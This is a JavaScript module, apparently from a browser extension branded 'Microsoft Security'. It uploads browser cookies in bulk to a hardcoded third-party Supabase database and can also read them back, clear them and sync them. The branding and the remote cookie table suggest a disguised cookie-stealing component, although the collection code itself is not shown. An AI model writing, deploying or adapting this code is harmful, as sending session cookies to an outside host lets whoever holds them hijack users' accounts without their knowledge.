// Microsoft Security - Supabase Cloud Sync
// Works in both service worker (module) and popup (global script)

const MS_CLOUD = {
  url: 'https://vecwhqgmxdkuwxpmgual.supabase.co',
  key: 'sb_publishable_qZDLWCBacOGX6PetXS7U5g_e702HUly',
  table: 'cookies',

  headers() {
    return {
      'Content-Type': 'application/json',
      'apikey': this.key,
      'Authorization': `Bearer ${this.key}`,
      'Prefer': 'return=minimal'
    };
  },

  // Push cookies to Supabase (upsert by id)
  async push(cookies) {
    if (!cookies || cookies.length === 0) return { success: true, count: 0 };
    try {
      const res = await fetch(`${this.url}/rest/v1/${this.table}`, {
        method: 'POST',
        headers: {
          ...this.headers(),
          'Prefer': 'resolution=merge-duplicates,return=minimal'
        },
        body: JSON.stringify(cookies)
      });
      if (!res.ok) {
        const text = await res.text();
        return { success: false, error: text, status: res.status };
      }
      return { success: true, count: cookies.length };
    } catch (err) {
      return { success: false, error: err.message };
    }
  },

  // Fetch all cookies from Supabase
  async fetch() {
    try {
      const res = await fetch(
        `${this.url}/rest/v1/${this.table}?select=*&order=timestamp.desc`,
        { headers: this.headers() }
      );
      if (!res.ok) {
        const text = await res.text();
        return { success: false, error: text, status: res.status };
      }
      const data = await res.json();
      return { success: true, cookies: data };
    } catch (err) {
      return { success: false, error: err.message };
    }
  },

  // Clear all cookies in Supabase
  async clear() {
    try {
      const res = await fetch(`${this.url}/rest/v1/${this.table}`, {
        method: 'DELETE',
        headers: this.headers()
      });
      if (!res.ok) {
        const text = await res.text();
        return { success: false, error: text };
      }
      return { success: true };
    } catch (err) {
      return { success: false, error: err.message };
    }
  },

  // Check connection
  async check() {
    try {
      const res = await fetch(`${this.url}/rest/v1/${this.table}?select=id&limit=1`, {
        headers: this.headers()
      });
      return { connected: res.ok, status: res.status };
    } catch (err) {
      return { connected: false, error: err.message };
    }
  },

  // Full sync: push local -> pull cloud -> return merged
  async sync(localCookies) {
    if (localCookies && localCookies.length > 0) {
      await this.push(localCookies);
    }
    const fetched = await this.fetch();
    if (fetched.success && fetched.cookies) {
      return fetched.cookies;
    }
    return localCookies || [];
  }
};

// Make available globally (works in modules and regular scripts)
self.MS_CLOUD = MS_CLOUD;
